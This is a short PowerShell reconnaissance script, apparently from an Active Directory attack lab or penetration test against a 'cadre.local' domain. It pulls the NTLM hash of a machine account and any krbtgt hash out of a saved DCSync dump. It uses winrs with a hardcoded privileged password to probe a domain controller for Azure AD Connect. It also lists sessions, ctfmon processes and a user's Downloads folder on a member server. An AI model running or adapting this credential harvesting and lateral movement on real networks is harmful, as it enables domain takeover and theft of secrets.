# Recon 2b: mbr01$ hash + AAD Connect (dc01) + analyst_cloud session/ctfmon (mbr01)
$ErrorActionPreference = 'Continue'

Write-Output '=== MBR01$ NTLM HASH ==='
Get-Content C:\Tools\ADTools\mbr01-dcsync.txt | Select-String -Pattern 'NTLM|Hash' | ForEach-Object { $_.Line }

Write-Output '=== CHILD KRBTGT (from same file if present) ==='
Get-Content C:\Tools\ADTools\mbr01-dcsync.txt | Select-String -Pattern 'krbtgt' | ForEach-Object { $_.Line }

Write-Output '=== AAD CONNECT (dc01) ==='
winrs -r:dc01.cadre.local -u:cadre.local\chief_command -p:C0mm@nd_Ch1ef! "sc query ADSync" 2>&1 | ForEach-Object { "DC01-ADSync|$_" }
winrs -r:dc01.cadre.local -u:cadre.local\chief_command -p:C0mm@nd_Ch1ef! "if exist \"C:\Program Files\Microsoft Azure AD Sync\" (echo AADSYNC_DIR_PRESENT) else (echo AADSYNC_DIR_ABSENT)" 2>&1 | ForEach-Object { "DC01|$_" }
winrs -r:dc01.cadre.local -u:cadre.local\chief_command -p:C0mm@nd_Ch1ef! "if exist \"C:\Program Files\Microsoft Azure AD Connect\" (echo AADCONNECT_DIR_PRESENT) else (echo AADCONNECT_DIR_ABSENT)" 2>&1 | ForEach-Object { "DC01|$_" }

Write-Output '=== MBR01 sessions + ctfmon ==='
winrs -r:mbr01.child.cadre.local -u:cadre.local\chief_command -p:C0mm@nd_Ch1ef! "query session" 2>&1 | ForEach-Object { "MBR01-SESSION|$_" }
winrs -r:mbr01.child.cadre.local -u:cadre.local\chief_command -p:C0mm@nd_Ch1ef! "tasklist /fi \"imagename eq ctfmon.exe\"" 2>&1 | ForEach-Object { "MBR01-CTFMON|$_" }
winrs -r:mbr01.child.cadre.local -u:cadre.local\chief_command -p:C0mm@nd_Ch1ef! "dir C:\Users\analyst_cloud\Downloads" 2>&1 | ForEach-Object { "MBR01-DL|$_" }

Write-Output '=== RECON2B_DONE ==='
